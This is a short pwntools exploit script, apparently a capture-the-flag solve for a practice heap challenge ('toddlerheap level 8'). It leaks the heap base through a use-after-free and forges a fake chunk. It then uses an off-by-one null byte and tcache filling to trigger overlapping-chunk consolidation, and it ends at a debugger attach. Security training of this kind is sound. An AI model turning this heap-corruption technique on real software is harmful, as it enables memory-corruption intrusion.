from pwn import *

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
'''



p.sendline("malloc 0 24")
p.sendline("free 0")
p.sendline("malloc 0 24")
p.sendline("puts 0")

p.recvuntil("Data: ")
leak = p.recvline().strip()

leak = int.from_bytes(leak, 'little')

heap_base_addr = leak << 12

print(hex(leak << 12))


p.sendline("malloc 1 56") # chunk A
p.sendline("malloc 2 40") # chunk B 0x30

p.sendline("malloc 3 248") # chunk C

p.sendline("read_copy 1")



fake_chunk_addr = heap_base_addr + 0x2c0
p.sendline(p64(0) + p64(0x60) + p64(fake_chunk_addr) + p64(fake_chunk_addr))




p.sendline("read_copy 2")
p.sendline(b"A" * 0x20 + p64(0x60))


for i in range(4, 11):
	p.sendline(f"malloc {i} 248")
for i in range(4, 11):
	p.sendline(f"free {i}")
	
	


# to set up the consolidation
# 1. overwrite the prev_size field to 0x60, the size of our fake chunk
# 2. using off-by-one to write a null byte to the first byte one the size field of chunk C to clear out the Prev_in_use bit

p.sendline("free 3")


p.sendline("malloc 12 344")

p.sendline("read_copy 12")
p.sendline(b"A" * 0x100)
gdb.attach(p, s)



p.interactive()
